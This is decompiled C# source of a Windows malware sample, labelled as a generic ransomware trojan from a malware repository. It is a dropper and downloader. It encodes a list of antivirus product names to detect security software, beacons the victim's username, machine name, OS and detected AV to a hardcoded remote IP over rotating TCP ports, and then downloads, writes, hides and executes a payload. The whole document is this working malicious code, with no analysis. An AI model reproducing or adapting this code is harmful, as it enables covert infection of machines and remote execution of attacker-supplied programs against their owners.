// Decompiled with JetBrains decompiler
// Type: imndprsw.MRIMN
// Assembly: imndprsw, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EFD885B6-4520-44DB-B2E0-3C429AF087A2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-0f154672427b1c1193a76d3ee72a849b9adebcd9439958f88ae62135333a96ef.exe

using imndprsw.Properties;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace imndprsw
{
  internal class MRIMN
  {
    private SROVC StateObj = new SROVC();
    public bool imndprswiswitch = false;
    private int imndprswbytRead = 0;
    private NetworkStream imndprswdatStream;
    public static byte[] encAvs = new byte[220]
    {
      (byte) 98,
      (byte) 100,
      (byte) 115,
      (byte) 115,
      (byte) 61,
      (byte) 66,
      (byte) 105,
      (byte) 116,
      (byte) 32,
      (byte) 68,
      (byte) 101,
      (byte) 102,
      (byte) 101,
      (byte) 110,
      (byte) 100,
      (byte) 101,
      (byte) 114,
      (byte) 44,
      (byte) 111,
      (byte) 110,
      (byte) 108,
      (byte) 105,
      (byte) 110,
      (byte) 101,
      (byte) 110,
      (byte) 116,
      (byte) 61,
      (byte) 81,
      (byte) 72,
      (byte) 101,
      (byte) 97,
      (byte) 108,
      (byte) 44,
      (byte) 98,
      (byte) 100,
      (byte) 97,
      (byte) 103,
      (byte) 101,
      (byte) 110,
      (byte) 116,
      (byte) 61,
      (byte) 66,
      (byte) 105,
      (byte) 116,
      (byte) 32,
      (byte) 68,
      (byte) 101,
      (byte) 102,
      (byte) 101,
      (byte) 110,
      (byte) 100,
      (byte) 101,
      (byte) 114,
      (byte) 32,
      (byte) 65,
      (byte) 103,
      (byte) 101,
      (byte) 110,
      (byte) 116,
      (byte) 44,
      (byte) 109,
      (byte) 115,
      (byte) 115,
      (byte) 101,
      (byte) 99,
      (byte) 101,
      (byte) 115,
      (byte) 61,
      (byte) 77,
      (byte) 83,
      (byte) 32,
      (byte) 69,
      (byte) 115,
      (byte) 115,
      (byte) 101,
      (byte) 110,
      (byte) 116,
      (byte) 105,
      (byte) 97,
      (byte) 108,
      (byte) 115,
      (byte) 44,
      (byte) 102,
      (byte) 115,
      (byte) 115,
      (byte) 109,
      (byte) 51,
      (byte) 50,
      (byte) 61,
      (byte) 70,
      (byte) 83,
      (byte) 101,
      (byte) 99,
      (byte) 117,
      (byte) 114,
      (byte) 101,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 112,
      (byte) 61,
      (byte) 75,
      (byte) 97,
      (byte) 115,
      (byte) 112,
      (byte) 101,
      (byte) 114,
      (byte) 115,
      (byte) 107,
      (byte) 121,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 103,
      (byte) 110,
      (byte) 116,
      (byte) 61,
      (byte) 65,
      (byte) 118,
      (byte) 105,
      (byte) 114,
      (byte) 97,
      (byte) 44,
      (byte) 115,
      (byte) 112,
      (byte) 98,
      (byte) 98,
      (byte) 99,
      (byte) 115,
      (byte) 118,
      (byte) 99,
      (byte) 61,
      (byte) 83,
      (byte) 121,
      (byte) 109,
      (byte) 97,
      (byte) 110,
      (byte) 116,
      (byte) 101,
      (byte) 99,
      (byte) 44,
      (byte) 117,
      (byte) 112,
      (byte) 100,
      (byte) 97,
      (byte) 116,
      (byte) 101,
      (byte) 114,
      (byte) 117,
      (byte) 105,
      (byte) 61,
      (byte) 77,
      (byte) 99,
      (byte) 65,
      (byte) 102,
      (byte) 101,
      (byte) 101,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 103,
      (byte) 117,
      (byte) 105,
      (byte) 61,
      (byte) 65,
      (byte) 86,
      (byte) 71,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 103,
      (byte) 99,
      (byte) 99,
      (byte) 61,
      (byte) 65,
      (byte) 86,
      (byte) 71,
      (byte) 44,
      (byte) 109,
      (byte) 98,
      (byte) 97,
      (byte) 109,
      (byte) 61,
      (byte) 65,
      (byte) 110,
      (byte) 116,
      (byte) 32,
      (byte) 77,
      (byte) 97,
      (byte) 108,
      (byte) 119,
      (byte) 97,
      (byte) 114,
      (byte) 101,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 97,
      (byte) 115,
      (byte) 116,
      (byte) 117,
      (byte) 105,
      (byte) 61,
      (byte) 65,
      (byte) 118,
      (byte) 97,
      (byte) 115,
      (byte) 116,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 97,
      (byte) 115,
      (byte) 116,
      (byte) 61,
      (byte) 65,
      (byte) 118,
      (byte) 97,
      (byte) 115,
      (byte) 116
    };
    private SRINM confs = new SRINM();
    public TcpClient imndprswsysSCK;
    public string ips = "5.189.134.216|nvidashd".Split('|')[0];
    public static int port = 5156;
    public static int aport = 7218;
    public static int bport = 9686;
    public static int cport = 12538;
    public static int dport = 16468;
    public bool isconnected = false;
    public int sysPort = 5156;
    public string appPath = "\\Fordk\\|imndprsw".Split('|')[0];
    public int port_sn = 0;
    private int imndprswbufSize = 1024;
    private string imndprswavs = "";
    public string mainApp = "fremowrk|imndprsw".Split('|')[0];
    public string excPath;

    public string zuissloadAV()
    {
      string str = "";
      try
      {
        Process[] processes = Process.GetProcesses();
        string[] strArray1 = Encoding.UTF8.GetString(MRIMN.encAvs, 0, MRIMN.encAvs.Length).Split(',');
        for (int index1 = 0; index1 < processes.Length; ++index1)
        {
          string lower = processes[index1].ProcessName.ToLower();
          if (lower.Length > 4)
          {
            for (int index2 = 0; index2 < strArray1.Length; ++index2)
            {
              if (strArray1[index2].Contains(lower))
              {
                string[] strArray2 = strArray1[index2].Split('=');
                str = str + " " + strArray2[1].Trim();
              }
            }
          }
        }
        return str;
      }
      catch
      {
        return "";
      }
    }

    public void imndprswports_switch()
    {
      ++this.port_sn;
      switch (this.port_sn)
      {
        case 0:
          this.sysPort = MRIMN.port;
          break;
        case 1:
          this.sysPort = MRIMN.aport;
          break;
        case 2:
          this.sysPort = MRIMN.bport;
          break;
        case 3:
          this.sysPort = MRIMN.cport;
          break;
        case 4:
          this.sysPort = MRIMN.dport;
          break;
      }
      if (this.port_sn < 4)
        return;
      this.port_sn = 0;
    }

    public string imndprswget_commend()
    {
      try
      {
        this.imndprswmore_data("doadez=brdir | " + Environment.UserName + "   |   " + Environment.MachineName + "   |   " + this.imndprswOsname() + " | " + this.imndprswavs + " | " + Path.GetFileNameWithoutExtension(Application.ExecutablePath));
        byte[] buffer = new byte[5];
        this.imndprswbytRead = this.imndprswdatStream.Read(buffer, 0, 5);
        int int32 = BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[int32];
        int offset = 0;
        for (int index = int32; index > 0; index -= this.imndprswbytRead)
        {
          int count = index > this.imndprswbufSize ? this.imndprswbufSize : index;
          this.imndprswbytRead = this.imndprswdatStream.Read(numArray, offset, count);
          offset += this.imndprswbytRead;
        }
        return Encoding.UTF8.GetString(numArray, 0, int32).ToString();
      }
      catch
      {
        return (string) null;
      }
    }

    public void imndprswopenMe()
    {
      try
      {
        byte[] bytes = new byte[5]
        {
          (byte) 97,
          (byte) 118,
          (byte) 97,
          (byte) 115,
          (byte) 116
        };
        string str1 = Encoding.UTF8.GetString(bytes, 0, bytes.Length).ToString();
        if (this.imndprswavs.ToLower().Contains(str1))
          return;
        this.excPath = Path.GetDirectoryName(Application.ExecutablePath);
        string str2 = this.confs.fileName + this.confs.fileExt;
        if (Resources.imndprsw.Length > 110)
        {
          File.WriteAllBytes(str2, Resources.imndprsw);
          File.SetAttributes(str2, FileAttributes.Hidden);
        }
        else if (File.Exists(this.confs.fileName))
        {
          File.Move(this.confs.fileName, str2);
          File.SetAttributes(str2, FileAttributes.Hidden);
        }
        Process process = new Process();
        process.StartInfo.FileName = str2;
        if (File.Exists(str2))
          process.Start();
      }
      catch
      {
      }
    }

    public void imndprswservData(object StateObj) => this.imndprswresponce();

    public string imndprswget_mpath() => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + this.appPath;

    private bool imndprswmore_data(string type)
    {
      try
      {
        byte[] bytes1 = Encoding.UTF8.GetBytes(type);
        int num1 = 0;
        int num2 = 5;
        byte[] bytes2 = BitConverter.GetBytes(bytes1.Length);
        byte[] buffer = new byte[num2 + bytes1.Length + (num1 - 1) + 1];
        bytes2.CopyTo((Array) buffer, 0);
        bytes1.CopyTo((Array) buffer, 5);
        int offset = 0;
        int count;
        for (int length = buffer.Length; length > 0; length -= count)
        {
          count = length > this.imndprswbufSize ? this.imndprswbufSize : length;
          this.imndprswdatStream.Write(buffer, offset, count);
          offset += count;
        }
        return true;
      }
      catch
      {
        return false;
      }
    }

    public bool imndprswconnetc()
    {
      try
      {
        if (!this.isconnected)
        {
          this.imndprswsysSCK = new TcpClient();
          this.imndprswsysSCK.Connect(this.ips, this.sysPort);
          this.imndprswbufSize = this.imndprswsysSCK.ReceiveBufferSize;
          this.imndprswdatStream = this.imndprswsysSCK.GetStream();
          this.isconnected = true;
        }
        return true;
      }
      catch
      {
        this.imndprswports_switch();
        this.imndprswiswitch = false;
        this.isconnected = false;
        return false;
      }
    }

    public void imndprswresponce()
    {
      try
      {
        if (this.imndprswiswitch || !this.imndprswconnetc() || !this.iyatxuwais_need())
          return;
        this.imndprswiswitch = true;
        string[] strArray1 = this.imndprswget_commend().Split('=');
        string lower = strArray1[0].ToLower();
        if (lower.Split('-').Length > 1)
          lower = lower.Split('-')[1];
        switch ("imndprsw" + lower)
        {
          case "imndprswinfo":
            this.imndprswiswitch = false;
            this.imndprswresponce();
            break;
          case "imndprswdoadez":
            try
            {
              string[] strArray2 = strArray1[1].Split('|');
              if (strArray2.Length > 1)
              {
                this.mainApp = strArray2[0];
                this.appPath = strArray2[1];
              }
            }
            catch
            {
            }
            try
            {
              if (!Directory.Exists(this.imndprswget_mpath()))
                Directory.CreateDirectory(this.imndprswget_mpath());
              byte[] bytes = this.imndprswhaveData();
              if (bytes != null)
              {
                int num = 1;
                while (true)
                {
                  if (File.Exists(this.imndprswget_mpath() + this.mainApp + ".exe!imndprsw".Split('!')[0]))
                  {
                    this.mainApp += num.ToString();
                    ++num;
                  }
                  else
                    break;
                }
                File.WriteAllBytes(this.imndprswget_mpath() + this.mainApp + ".exe!imndprsw".Split('!')[0], bytes);
                Thread.Sleep(140);
                new Process()
                {
                  StartInfo = {
                    FileName = (this.imndprswget_mpath() + this.mainApp + ".exe!imndprsw".Split('!')[0])
                  }
                }.Start();
                break;
              }
              break;
            }
            catch
            {
              break;
            }
        }
        this.imndprswiswitch = false;
      }
      catch
      {
        this.isconnected = false;
        this.imndprswiswitch = false;
      }
    }

    public string imndprswOsname()
    {
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion!imndprsw".Split('!')[0]);
        if (registryKey != null)
        {
          string str = registryKey.GetValue("ProductName!imndprsw".Split('!')[0]).ToString().Trim();
          if (str != null)
            return str;
        }
        OperatingSystem osVersion = Environment.OSVersion;
        int num = osVersion.Version.Major;
        string str1 = num.ToString();
        num = osVersion.Version.Minor;
        string str2 = num.ToString();
        return str1 + ">" + str2;
      }
      catch
      {
        return "6>1!imndprsw".Split('!')[0];
      }
    }

    private byte[] imndprswhaveData()
    {
      try
      {
        int offset = 0;
        byte[] buffer1 = new byte[5];
        this.imndprswbytRead = this.imndprswdatStream.Read(buffer1, 0, 5);
        int int32 = BitConverter.ToInt32(buffer1, 0);
        byte[] buffer2 = new byte[int32];
        for (int index = int32; index > 0; index -= this.imndprswbytRead)
        {
          int count = index > this.imndprswbufSize ? this.imndprswbufSize : index;
          this.imndprswbytRead = this.imndprswdatStream.Read(buffer2, offset, count);
          offset += this.imndprswbytRead;
        }
        return buffer2;
      }
      catch
      {
        return (byte[]) null;
      }
    }

    public bool iyatxuwais_need() => !File.Exists(this.imndprswget_mpath() + this.mainApp + ".exe") || Process.GetProcessesByName(this.mainApp).Length == 0;

    public void imndprswloadstart()
    {
      try
      {
        this.imndprswavs = this.zuissloadAV();
        this.StateObj.timer = new System.Threading.Timer(new TimerCallback(this.imndprswservData), (object) this.StateObj, 23010, 61500);
      }
      catch
      {
      }
    }
  }
}
